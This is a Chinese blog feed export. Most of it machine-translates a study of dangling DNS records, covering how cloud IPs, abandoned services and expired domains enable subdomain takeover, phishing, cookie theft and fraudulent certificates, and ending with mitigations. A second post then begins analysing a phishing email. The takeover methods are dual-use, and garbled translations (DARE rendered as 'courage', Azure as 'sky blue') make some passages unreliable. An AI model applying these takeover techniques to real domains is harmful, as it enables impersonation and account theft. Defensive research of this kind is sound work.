alt="此处输入图片的描述"><br>图11：随着时间的推移，在云上传输的IP地址数</p><p>然而，ec2classic上的数字只在最初几天迅速增加，然后随着时间的推移停止增长。<br>IPScouters的速度主要受三个因素的制约：云的请求速率限制、IP分配的随机性和IP地址空间的密度。对于第一个约束，我们发现两个API调用之间的5秒延迟（IP分配或释放）在EC2中可以正常工作，但是在Azure中至少应该使用10秒的延迟。在这种配置下，ipscouter每天分别向EC2和Azure发送7900和4300个IP分配请求</p><p>虽然看起来IP分配并不是真正随机的，但是云不太可能重用最近发布的IP地址。<br>这就是为什么在EC2-VPC和Azure上，每天获得的新IP地址数量仍然是发送到云的分配请求数量的一半左右。这个速度足够快，可以在每个云中容纳大量IP地址。</p><p>ec2classic的速度显著下降可能是由于拥挤的IP地址空间造成的。例如，对于在我们的数据集中使用EC2的所有域，大约69%的域托管在ec2classic上。</p><p>相比之下，EC2-VPC和Azure的地址空间更大，但用户却更少。请注意，尽管EC2和Azure的IP地址空间包括数百万个IP地址<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%814.jpg">4</a>，[18]，我们推测在任何时候只有一部分IP地址空间是可用的。<br>我们只为每个云平台部署一个IPScouter，而对手可能会部署IPScouter农场来显著加快IP挤奶。最后，云上的IP分配是一个值得深入研究的复杂问题，我们将这一探索作为我们未来的工作。在这项工作中，我们的目标将是证明Dare问题是一个真正和严重的威胁。</p><p><strong>已确认和潜在的风险</strong></p><p>在我们的测量中，所有确认的DARE都来自EC2，EC2经典版的DARE约为93%。<br>考虑到IPScouter经典的milks IP地址仅来自一个区域，如果我们将搜索扩展到其他EC2区域，那么就有更多的潜在胆量得到了证实。同时，如图9所示，EC2上的潜在DARE数量明显大于Azure上的DARE。这是因为Azure是一个相对较新的平台，它的市场份额比EC2小得多。例如，我们发现，在所有在数据集中使用云的域中，Azure主机只有十分之一。因此，需要更多的时间来牛奶所需的天青IPs。然而，这并不能降低潜在攻击的一般性；问题是普遍的。随着云层越来越拥挤，威胁将更加严重和广泛</p><p>通过进一步交叉检查存档.org，我们成功地找到了约52.6%潜在风险的快照。因此，这些领域可以声称是真正的胆敢更高的信心。<br>我们只在教育和政府区域发现一些潜在的挑战。<br>这些区域中的域大部分是使用图5（a）的范例部署的，其中没有使用云IP。此外，政府区域中的大多数域使用Rackspace[19]，而不是EC2&#x2F;Azure。</p><p><strong>潜在模式</strong></p><p>如图8（a）和图9所示，这种攻击向量可以有效地利用顶点域和子域。我们试图通过人工搜索和检查所有已确认的胆量和100个随机抽样的潜在胆量的相关信息来推断这些胆量是如何引入的。<br>虽然许多易受攻击的apex域名都是价值较低的玩具网站，但超过半数的域名属于初创企业，我们可以在CrunchBase<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%817.jpg">7</a>、Twitter和Github上找到公司信息。其中一个例子在§6.1中描述。这些初创企业要么被关闭，要么被重新命名，要么被其他公司收购。在我们研究的所有案例中，尽管域所有者已经在云中发布了托管资源，但他们仍在继续更新他们的域。这些易受攻击的apex域为攻击者进行网络钓鱼和诈骗提供了有价值和有吸引力的属性。</p><p>对于这些脆弱的子域，我们发现了两个主要的原因。首先，由于网站重构，引入了dare。<br>一个这样的例子是support.mediafire.com网站. 此前，其主页上的“获取支持”链接到<a href="http://www.support./">www.support。</a><br>mediafire.com&#x2F;help. 但是，它现在指向<a href="http://www.mediafire.com/help%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BA%91%E4%B8%AD%E7%9A%84%E4%B8%BB%E6%9C%BAsupport.mediafire.com%E7%BD%91%E7%AB%99%E5%B7%B2%E7%BB%8F%E8%A2%AB%E9%87%8A%E6%94%BE%E4%BA%86%E3%80%82%E6%98%BE%E7%84%B6%EF%BC%8C%E5%9F%9F%E6%89%80%E6%9C%89%E8%80%85%E5%BF%98%E8%AE%B0%E4%BA%86%E7%94%A8%E8%BF%99%E4%B8%AA%E6%9B%B4%E6%94%B9%E6%9B%B4%E6%96%B0%E4%BB%96%E4%BB%AC%E7%9A%84DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E5%9C%A8%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90%E4%B8%AD%EF%BC%8Cautotrader.co.uk%E5%81%9C%E6%AD%A2%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86%E7%9A%84ADN%EF%BC%88ns4.autotrader.co.uk)%E5%B9%B6%E5%B0%86aDNS%E8%A7%A3%E6%9E%90%E5%A7%94%E6%89%98%E7%BB%99verisigndns%E3%80%82%E8%BF%99%E6%AC%A1%E5%A7%94%E6%B4%BE%E4%B9%8B%E5%90%8E%EF%BC%8C%E8%99%BD%E7%84%B6%E4%BB%96%E4%BB%AC%E6%AD%A3%E7%A1%AE%E5%9C%B0%E6%9B%B4%E6%96%B0%E4%BA%86NS%E8%AE%B0%E5%BD%95%EF%BC%8C%E4%BD%86%E4%BB%96%E4%BB%AC%E5%BF%98%E8%AE%B0%E5%88%A0%E9%99%A4%E7%B2%98%E5%90%88%E8%AE%B0%E5%BD%95%E3%80%82%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8E%9F%E5%9B%A0%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%E5%B7%B2%E7%BB%8F%E5%81%9C%E6%AD%A2%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%8Cbooks.panerabread.com%E6%AD%A4%E5%89%8D%E6%9B%BE%E4%B8%8E%E4%BA%9A%E9%A9%AC%E9%80%8A%E5%90%88%E4%BD%9C%E9%94%80%E5%94%AE%E5%9B%BE%E4%B9%A6%E3%80%82%E8%BF%99%E9%A1%B9%E6%9C%8D%E5%8A%A1%E7%8E%B0%E5%9C%A8%E4%BC%BC%E4%B9%8E%E5%85%B3%E9%97%AD%E4%BA%86%E3%80%82%E5%90%8C%E6%A0%B7%EF%BC%8C%E6%89%98%E7%AE%A1%E8%B5%84%E6%BA%90%E8%A2%AB%E9%87%8A%E6%94%BE%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%83%E7%9A%84adn%E6%B2%A1%E6%9C%89%E6%9B%B4%E6%96%B0%E3%80%82">www.mediafire.com/help，以及云中的主机support.mediafire.com网站已经被释放了。显然，域所有者忘记了用这个更改更新他们的DNS服务器。在另一个例子中，autotrader.co.uk停止自我管理的ADN（ns4.autotrader.co.uk)并将aDNS解析委托给verisigndns。这次委派之后，虽然他们正确地更新了NS记录，但他们忘记删除粘合记录。第二个原因很简单，某些服务已经停止。例如，books.panerabread.com此前曾与亚马逊合作销售图书。这项服务现在似乎关闭了。同样，托管资源被释放，但是它的adn没有更新。</a></p><p><strong>成本分析</strong></p><p>在我们的研究中，IPScouters在EC2上的价格约为0.07美元，在Azure上的价格为0.005美元。如此低的成本使得长期IP挤奶成为可能。一旦获得了所需的IP，用最便宜的虚拟机保存它，它的成本是每小时0.0115美元和0.023美元，在EC2和Azure上分别是每年100.74美元和201.48美元。相比之下，同样的费用只会给对手提供几个最低效率的打字域名。</p><h3 id="5-3-废弃的第三方服务"><a href="#5-3-废弃的第三方服务" class="headerlink" title="5.3 废弃的第三方服务"></a>5.3 废弃的第三方服务</h3><p>图12显示了在每个第三方服务上发现的DARE的数量，显示了可以在每个服务平台上找到DARE。Mailgun上的大多数胆量都在数据集D中，因为电子邮件服务通常托管在apex域下。相反，非邮件服务通常充当apex域的子功能，因此驻留在子域中。我们发现这个Dare问题是相当令人担忧的，因为Dare甚至可以在著名的领域中找到，比如雅虎网以及麻省理工大学.</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8114.jpg" alt="此处输入图片的描述"><br>图12：每个第三方服务上的dare数。</p><p><strong>悬挂模式</strong><br>虽然大多数的胆量是因为第三方服务被放弃了，但是我们在其中一个服务Wordpress中发现了一个有趣的模式，如下例所示。</p><pre><code class="hljs">www2.opensky.com@ns-1448.awsdns-53.org.:www2.opensky.com. CNAME blog.opensky.com.blog.opensky.com. CNAME openskymerchants.wordpress.com.</code></pre><p>网站博客opensky.com仍在使用中，可以访问其原始网页。域所有者打算指导www2.opensky.com网站到博客opensky.com使用CNAME。</p><p>不幸的是，此配置无法正常工作并无法访问ww2.opensky.com网站将到达Wordpress上的错误页。问题在于博客opensky.com在Wordpress上声明，Wordpress根据初始域名发送web请求。从二战开始。opensky.com网站没有声明，Wordpress将把所有请求定向到错误页。因此，攻击者可以声明子域，然后所有后续请求都将被重定向到攻击者控制下的登录页，尽管CNAME试图重定向到博客opensky.com.<br>虽然我们只在Wordpress上观察到这种情况，但Github、Cloudapp、Shopify和Herokuapp等服务也可能容易受到这种错误配置的影响。其他三个服务，包括Tumblr、Statuspage和unbounde，不会遇到这个问题，因为只有当一个子域指向一个特定的域（如域名.tumblr.com.</p><p><strong>成本分析</strong></p><p>所有这些服务都提供免费或免费试用帐户。因此，对手注册许多免费帐户几乎不需要付出任何代价。</p><h3 id="5-4-过期的域"><a href="#5-4-过期的域" class="headerlink" title="5.4 过期的域"></a>5.4 过期的域</h3><p><strong>悬挂模式</strong></p><p>正如我们的结果所显示的那样，即使是管理良好的区域中的许多子域，如edu和Alexa的顶级域，都指向使用CNAME的过期域。进一步的检查揭示了这些过期域的三种模式，如表6所示。首先，超过三分之一的过期域与它们的别名子域非常相似。例如，模块.rabobank.nl指向荷兰合作银行-霍伊以及伯克利分校指向rpsberkeley.org网站. 第二，如[46]，[50]所示，很大一部分子域指向过期的外部服务。一个例子是21vcdn.com网站. 子域，世纪佳缘，指向自2010年起停止工作的服务。第三，我们发现了一些打字错误。例如，b。ns.trnty.edu公司指向awsnds-18.net。显然，域所有者打算使用CNAME记录将他们以前的adn重定向到amazonaws提供的adn。由于输入错误，此尝试失败。</p><p>域当前使用NS记录直接指向amazonaws，但是输入错误的CNAME记录仍然存在。其余33%的过期域名基本上都是随机字符。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8115.jpg" alt="此处输入图片的描述"><br>表6：过期域的模式</p><p><strong>对滥用域名注册的现有抗辩</strong></p><p>我们已经重新注册了论文中列出的所有过期示例（即8个过期域）。大约三个月后，我们重新注册的域名仍然有效，我们只收到一个域名所有者的警告。这表明大多数过期域名确实容易被滥用。域名注册人和域名所有者可以采用现有的防御机制来防止滥用域名的注册。首先，他们可以不批准恶意域列表中的那些域。但是，我们发现这些列表中没有一个已识别的过期域。其次，他们可以禁止与知名域名非常相似的域名被任意注册。在我们的数据集中，我们发现这可以防止大约46%的过期域被利用。<br>不幸的是，仍然有54%的过期域与易受攻击的子域无关。注册者很难确定这样一个过期的域是否与Dares相关联，使得这些不当行为很难被阻止。因此，需要更有效的防御措施来防止滥用域名注册。</p><p><strong>成本分析</strong></p><p>这些过期域名也相当便宜。图13显示了重新注册这些域一年的价格。大多数域名的价格不到12美元。考虑到这些易受攻击的子域的重要价值，这个代价可以忽略不计。</p><h3 id="5-5-剥削悬挂"><a href="#5-5-剥削悬挂" class="headerlink" title="5.5 剥削悬挂"></a>5.5 剥削悬挂</h3><p>我们现在确定了可利用的胆量窗口。对于由云中释放的IP地址和放弃的第三方服务引起的，我们通过检查存档.org. 对于过期的域，我们可以找到它们的过期日期。我们的研究结果表明，所有的胆小鬼都有一个大的可利用窗口，从3个月到7年不等，其中90%以上的人在一年以上的时间内处于脆弱状态。</p><h3 id="5-6-伦理考虑"><a href="#5-6-伦理考虑" class="headerlink" title="5.6 伦理考虑"></a>5.6 伦理考虑</h3><p>在这项研究的过程中，我们没有对仔细检查过的域或访问我们成功识别的DARE的访问者进行任何敌对活动。我们还与我们机构的内部评级机构进行了核实，确认我们不需要获得其批准。<br>文中所举的所有例子都已被我们纠正或加以防御性利用。我们已经向所有受影响的域发送了通知，并收到了大约一半的域的响应。几乎所有的顶点域都没有回复。虽然大多数分区域都承认我们的报告，但只有三分之二的分区采取了补救行动。我们的经验类似于李等的观察。[47]。</p><h2 id="0x06-威胁分析"><a href="#0x06-威胁分析" class="headerlink" title="0x06 威胁分析"></a>0x06 威胁分析</h2><p>在许多安全范例中，域名是可信的基础。<br>例如，人类用户和许多恶意域检测器倾向于将具有干净历史记录的apex域视为可信域。用户也信任apex域的所有子域，这些子域具有良好的信誉。不幸的是，我们的研究表明，这种信任可能会被对手滥用，从而发动一些更强大的攻击。在本节中，我们将描述和讨论四种类型的威胁，这些威胁可能会因利用胆量而大大加剧。</p><h3 id="6-1-诈骗、网络钓鱼等"><a href="#6-1-诈骗、网络钓鱼等" class="headerlink" title="6.1 诈骗、网络钓鱼等"></a>6.1 诈骗、网络钓鱼等</h3><p>对手在诈骗、网络钓鱼和许多其他形式的恶意活动中采用的常见手法包括打字[44]、doppelganger域<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8117.jpg">8</a>和同形异义词攻击[41]。然而，这些方法的有效性有限，警惕的用户很容易发现它们。此外，许多自动系统如EXPOSURE[29]和Notos[25]已经被提出来检测这些恶意域。</p><p>Dares可以从两个主要方面显著提高这些恶意攻击的有效性。首先，不是注册新的域名，对手直接滥用子域或顶点域名通常有一个干净的历史和良好的声誉。被滥用的域具有不变的注册信息，甚至可以驻留在相同的IP地址上。第二，在可承受的成本下，对手可以利用googleadwords等服务在短时间内锁定大量受害者。接下来我们将说明三个案例研究。</p><p><strong>案例1：暂停域被恢复</strong></p><p>GeoIQ.com网站<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%819.jpg">10</a> 是一个基于web的位置分析平台，提供数据共享、风险缓解和实时分析服务。从其ADN检索到的A记录如下所示。我们可以看到这个域托管在EC2上。</p><pre><code class="hljs">geoiq.com@ns-1496.awsdns-59.org.:geoiq.com. 1800 A 23.21.108.12</code></pre><p>2012年7月，GeoIQ.com网站被另一家公司收购存档.org显示此域的最后一个快照是在2015年8月1日捕获的。这意味着域名拥有者在2015年8月左右发布了EC2中的托管资源，这后来被我们的IPScouter成功获得。然而，世界卫生组织的数据显示，该域名每年仍会更新一次。</p><pre><code class="hljs">Domain Name: GEOIQ.COMRegistrar: GODADDY.COM, LLCUpdated Date: 21-sep-2015Creation Date: 20-sep-2005Expiration Date: 20-sep-2016</code></pre><p>通过简单的谷歌搜索，我们可以在许多平台上找到他们的账户，包括Github、Twitter和Youtube。对手可以冒充该域并更有效地发起社会工程攻击。</p><p><strong>案例2：继承自apex域的信任</strong></p><p>mediafire.com网站Alexa在我们的研究中排名为169的云文件存储服务提供商。他们的子域之一，support.mediafire.com网站，托管在EC2上，但后来不再使用。EC2上的托管服务被发布，然后被我们的IPScouters成功获得。</p><pre><code class="hljs">support.mediafire.com@ns-1179.awsdns-19.org.:support.mediafire.com. 86400 A 23.21.94.181</code></pre><p>子域支持是许多域为用户提供支持服务的常用做法。类似的工作也有很多类似的情况。如果对手在这些子域下托管恶意内容或进行鱼叉式钓鱼，即使是最警惕的用户也会成为攻击的受害者。</p><p><strong>案例三：通过谷歌广告词收获</strong></p><p>Travelocity.com是最大的在线旅行社之一，在我们研究的时候在Alexa排名1810。我们发现它的一个子域使用CNAME记录指向一个过期的域。</p><pre><code class="hljs">can.travelocity.com@pdns1.ultradns.net.:can.travelocity.com. CNAME travelocitycancontest.com.</code></pre><p>为了证明一个对手能够以多快的速度传播攻击以及以什么代价，我们注册这个过期的域并将访问者引导到我们的子域使用谷歌广告词。为了尽量减少我们的研究可能造成的不便，我们在记录了源IP地址的MD5后，将所有访问者重定向到Travelocity的主页。由于我们与用户的交互仅限于记录散列IP地址，因此我们认为在这个实验中没有伦理意义。我们进行了两天的活动，记录了141个不同的IP地址，花费了1.38美元。对手可以设置一个假登录页面或直接窃取cookies。无论哪种情况，数千个账户都可能被泄露。</p><h3 id="6-2-主动盗取-cookie"><a href="#6-2-主动盗取-cookie" class="headerlink" title="6.2 主动盗取 cookie"></a>6.2 主动盗取 cookie</h3><p>对手有多种方法来窃取和劫持cookies。一种简单的方法要求用户和网站之间的流量是不加密的，并且对手能够监视流量。<br>这种强烈的需求限制了这种窃取cookie方法的规模和可行性。例如，几乎所有顶级网站都至少采用了部分HTTPS[54]，敏感的cookies通常只通过HTTPS传输（使用Secure标志）。或者，如果HTTP cookies没有设置HttpOnly标志，则对手可以通过其他方式（如XSS攻击）获取它们。<br>随着这一标志被部署在更多的网站上，XSS攻击将在cookie劫持中变得无效。然而，通过利用胆量，对手可以主动从全球用户那里窃取cookies，而不管HttpOnly和Secure标志是什么。这可能不仅会导致隐私泄露，还会导致账户完全受损。</p><p>启示。只要可能，包含敏感帐户信息的Cookie的作用域应仅限于受信任的子域。<br>依赖安全标志来防止cookie窃取也是不安全的。众所周知，Secure标志缺乏完整性[58]，但它通常被认为是安全的，不会被窃取。然而，这一假设将受到挑战。</p><h3 id="6-3-电子邮件欺诈"><a href="#6-3-电子邮件欺诈" class="headerlink" title="6.3 电子邮件欺诈"></a>6.3 电子邮件欺诈</h3><p>电子邮件仍然是网络欺诈中最受欢迎的攻击载体之一。<br>恶意电子邮件通常使用不受对手控制的真实地址发送。由于对手无法接收并进一步确认来自受害者的回复电子邮件，电子邮件攻击是开环的。然而，通过利用胆量，对手不仅可以发送电子邮件，还可以接收电子邮件。特别是，一些流行的现有反垃圾邮件机制，包括发件人策略框架（Sender Policy Framework，SPF）和域名识别邮件（DomainKeys Identified Mail，DKIM）可以被绕过。通过这些能力的增强，对手可以更有效、更高效地进行多种形式的在线欺诈，从垃圾邮件、鱼叉式网络钓鱼到甚至滥用亚马逊Prime会员资格等独家在线会员资格。</p><h3 id="6-4-伪造的SSL证书"><a href="#6-4-伪造的SSL证书" class="headerlink" title="6.4 伪造的SSL证书"></a>6.4 伪造的SSL证书</h3><p>现代网站通常通过强制的HTTPS连接提供关键的在线服务，并且它们只允许敏感的cookie通过使用安全标志的加密连接进行传输。例如，下面是一个设置了安全标志的cookietravelocity.com:</p><pre><code class="hljs">Set-Cookie: JSESSION=d1b8eb43-xxx; Domain=.travelocity.com; Path=/; Secure; HttpOnly</code></pre><p>为了窃取这些安全cookie，对手必须在易受攻击的子域上设置HTTPS网站，并由证书颁发机构（CA）签名。为了确保证书的真实性，CA通常要求订阅者证明（子）域的所有权。<br>这通常涉及通过apex域下的特定电子邮件地址或WHOIS数据库中的电子邮件地址进行验证。我们威胁模型中的对手很难完成这一验证。</p><p>然而，新兴的证书颁发机构，如Let’s Encrypt<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8114.jpg">15</a>，倾向于利用自动化和免费的验证简化签发证书的程序。让我们加密为订阅者提供两种方法来证明域的控制，其中一种方法涉及在被签名的域下提供HTTP资源。不幸的是，当对手通过云IP或过期域攻击Dare时，他们可以完全访问该域的托管资源，因此可以通过“让我们加密”的挑战。利用这个原理，我们成功地得到了一个子域can.travelocity.com[23]真实签名。</p><p><strong>启示</strong></p><p>仅仅使用一个挑战来验证所有权是不够的。考虑到adn（在darens的情况下）和域托管资源都可能受到危害，从特定的电子邮件（例如WHOIS数据库中的电子邮件）寻求确认似乎更可靠。</p><h2 id="0x07-缓解措施"><a href="#0x07-缓解措施" class="headerlink" title="0x07 缓解措施"></a>0x07 缓解措施</h2><p>几乎所有以前的努力，例如域名系统安全扩展（DNSSEC），都试图保护返回给客户端的DNS记录的完整性和真实性。对DNS记录指向的资源进行身份验证的关注很少。域所有者通常被假定保持他们的aDNS服务器的更新和一致性。不幸的是，我们的工作表明，这种假设在实践中很少成立，由此产生的问题Dare是一个严重和广泛的威胁。在本节中，我们将提出并讨论一些机制，这些机制可以通过少量的手动操作来减轻DARE。特别是，我们重点研究了三个攻击向量所利用的DNS数据域。这些机制的关键原则是，所有资源都应被视为短暂的</p><p><strong>验证临时IP地址</strong></p><p>我们提出了一种机制，允许aDNS服务器在添加或更新记录时自动验证IP地址。图14显示了该机制的工作流程。ADN和IP地址被添加&#x2F;更新的相应服务器都有一个守护进程。当添加或更新A记录时，adn与服务器通信并向其发出密钥。然后，aDNS定期检查密钥的有效性。虽然该体系结构简单，但在实际应用中还需要解决一系列问题，如如何保护服务器上的密钥以及在adn上引起的开销。我们将这一机制的执行和评估作为我们今后的工作。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8116.jpg" alt="此处输入图片的描述"></p><p><strong>通过第三方服务的ADN打破解析链</strong></p><p>在数据字段指向外部服务的情况下，我们建议Shopify这样的服务不推荐使用记录，并在CNAME中为每个用户使用一个独立的名称空间。在我们的观察中，除了shoppify和Tumblr之外，所有的外部服务都反对使用A记录。为了保护过时的CNAME记录，我们为每个用户定义一个独立的名称空间。由于每个用户都有一个唯一的帐号，服务可以生成CNAME记录使用{user-specified name}格式。<br>用户帐户.service.com. 在同一帐户下管理的多个域被指定为唯一的名称，如：</p><pre><code class="hljs">@aDNS of Shopifystore-1.alice.myshopify.com CNAME shops.shopify.comstore-2.alice.myshopify.com CNAME shops.shopify.com</code></pre><p>一旦store-1的域变得无人认领，则store-1.alice.myshopify.com应该从Shopify的adn中删除，因此无法解析挂起的域。</p><p><strong>正在检查过期的域</strong></p><p>. 在现有的DNS系统中，只有名称字段中的域已过期的记录才会从DNS服务器中清除，而那些在数据字段中有过期域的记录（例如由CNAME指向）通常被忽略。我们已经证明，这些陈腐的记录可以作为胆量的主要来源。我们主张aDNS服务器应该定期检查数据字段中的域过期情况。由于此检查仅在到期日临近时触发，因此其频率非常低，而且总体开销很小。作为定期检查的补充，Alembic[46]可以用来定位域所有权的潜在变化。我们还考虑使用表6中列出的模式扩展Alembic。</p><h2 id="0x08-相关工作"><a href="#0x08-相关工作" class="headerlink" title="0x08 相关工作"></a>0x08 相关工作</h2><p>在过去的几十年里，人们对DNS的安全性进行了大量的研究。下面，我们将对与我们密切相关的前期工作进行概述。</p><p><strong>缓存中毒攻击</strong></p><p>对手可以利用DNS服务器中的漏洞注入不正确的条目，从而将用户定向到由对手控制的另一台服务器。[自20世纪90年代以来，[已经提出了一些缓解措施]，[自20世纪90年代以来，[已经提出了一些缓解措施]，[自20世纪90年代以来]。对手也可以使用伪造的DNS响应（即，非路径DNS中毒[38]、[39]、[40]、[43]）篡改DNS解析程序。对手最近部署了更多的恶意解析权限，而不是向良性DNS服务器或解析程序注入条目[33]，[45]。<br>虽然有同样的负面影响，但我们的工作不同于缓存中毒，因为我们既不篡改DNS解析，也不设置恶意DNS服务。</p><p><strong>DNS不一致和配置错误</strong></p><p>DNS采用层次树结构组织，不需要节点间的强一致性。因此，上层服务器中的数据更改不能覆盖递归解析程序中的缓存副本。过时的数据在达到TTL限制之前将继续为用户服务。弱缓存一致性可能会产生类似ghost域名[42]的漏洞，即那些已经从TLD服务器上删除但仍然可以解决的域。有人提出了一些解决这个问题的办法。例如，DNScup[30]主动将权威服务器中的更改推送到递归解析器。<br>然而，在我们的研究中，我们发现DNS记录和连接的资源之间的不一致也很普遍，并且可能造成严重的安全威胁。</p><p>Pappas等人。[51]诊断了三种错误配置，发现这些错误配置普遍存在，并降低了DNS的可靠性和性能。相比之下，我们的工作发现了一种新的DNS错误配置，并研究了其潜在的安全威胁。尽管dare的问题在两个非学术博客<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8118.jpg">9</a>、<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8112.jpg">13</a>中受到了一些关注，但是我们的工作是第一次对这个问题进行大规模的系统研究，包括DNS记录类型和高价值域中dare的大小。我们还发现了两个更易受攻击的第三方服务，其中一个（即Azure云服务）甚至无法使用域所有权验证进行保护。</p><p><strong>恶意域</strong></p><p>最后，许多工作都集中在理解和识别恶意域名上。姜等。<br>[42]发现一个恶意域名在被从上层DNS服务器上删除或在其TTL过期后仍然可以被解析。郝等。[36]研究了垃圾邮件发送者的域名注册行为，发现垃圾邮件发送者通常会重新注册过期的域名。此外，Lever等人。[46]描述了过期域的恶意重新注册，并证明了剩余信任滥用是许多安全问题的根本原因。本文所研究的风险也可以归为剩余信托滥用。最显著的区别在于，胆量不仅可能是由过期域名引起的，还可能是大量的子域引起的，包括那些最知名的网站的子域。</p><p>最近的研究也提出了区分良性和恶意域的方法。这些方法从词汇表示、注册信息和名称服务器的属性中提取特征[25]、[29]、[35]、[48]。Yadav等人。[56]和Antonakakis等人。[26]提出了识别高级僵尸网络用于指挥和控制的动态生成域的方法。我们工作中出现的安全威胁会显著降低这些探测器的性能。</p><h2 id="0x09-结论"><a href="#0x09-结论" class="headerlink" title="0x09 结论"></a>0x09 结论</h2><p>本文研究了被广泛忽视的DNS记录悬挂问题，指出Dare是一种严重而广泛的安全威胁。为了利用这些不安全的胆量，我们提出了三种攻击媒介，即云IP、放弃的第三方服务和过期域，以进行域劫持。然后我们对包含代表性域的四个数据集进行了大规模测量，以量化野外不安全胆量的大小。我们发现，即使是像edu和Alexa这样管理良好的网站，也有数百个不安全的胆子。这是非常令人担忧的，因为胆小鬼可以显著增强许多形式的在线欺诈活动，如垃圾邮件和饼干窃取。Dares的根本原因是缺乏对DNS记录所指向的资源的真实性检查。为此，我们提出了三种防御机制，可以用较少的人力资源有效地减轻胆量。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>原文：<a href="https://dl.acm.org/doi/10.1145/2976749.2978387">https://dl.acm.org/doi/10.1145/2976749.2978387</a></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>邮件钓鱼攻击与溯源分析记录</title>
    <link href="/2020/01/20/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/01/20/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>本文是基于网络上文章 “邮件钓鱼攻击与溯源” 一文的内容进行深度分析和亲自溯源的记录，原文因为一些原因已经被删除，本文也经过了对具体地址和内容的脱敏，仅供研究和学习目的。</p><h2 id="0X01根据钓鱼邮件内容进行信息挖掘"><a href="#0X01根据钓鱼邮件内容进行信息挖掘" class="headerlink" title="0X01根据钓鱼邮件内容进行信息挖掘"></a><strong>0X01根据钓鱼邮件内容进行信息挖掘</strong></h2><p><strong>原文从信头中挖掘到的信息如下：</strong></p><pre><code class="hljs">钓鱼网站 www.rosturxxxx.com 137.74.xxx.5 法国 钓鱼链接: http://www.rosturxxxx.com/shells/logon.secureaccess/?ml=test@test.cn 发件地址 no-response@365.mirohaxxxx.sk 服务商 Platon Technologies, s.r.o 斯洛伐克 SMTP sysmailout1.platon.sk 85.248.xxx.17 斯洛伐克</code></pre><p>这里其实应该注意到的是我们对邮件的信息收集不能仅仅局限于邮件表面看到的东西，我们需要查看信头，如果觉得看起来不舒服，还可选择导出邮件，这时候就会生成一个 .eml 文件。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B61.png" alt="此处输入图片的描述"></p><p>这样我们就能看到一个邮件的全貌(邮件本身是由信头和邮件体组成的，我们一般看到的都是邮件体而忽略了邮件头部的重要信息，<strong>邮件头和邮件体是由一个空行分隔的</strong>)</p><h3 id="邮件头信息解释"><a href="#邮件头信息解释" class="headerlink" title="邮件头信息解释"></a><strong>邮件头信息解释</strong></h3><h4 id="1-Received"><a href="#1-Received" class="headerlink" title="(1)Received"></a><strong>(1)Received</strong></h4><p>路由信息，记录了邮件传递过程。</p><blockquote><p><strong>特点：</strong></p><p>整个邮件原文中，只有Received段是不由发件方编辑的，是由接收方加载的<br>由所经过的路由在信头<strong>最顶部</strong>添加<br>每经过一个处理，必须在最上层添加一个Received,且不得改变其他Received的顺序<br>这里面的 from ，by 分别表示接受和发送的邮件服务器，for 是最终的收件人地址</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/undefined%E5%8E%9F%E5%A7%8B%E9%82%AE%E4%BB%B6.png" alt="此处输入图片的描述"></p><p><strong>(2)Data:</strong> 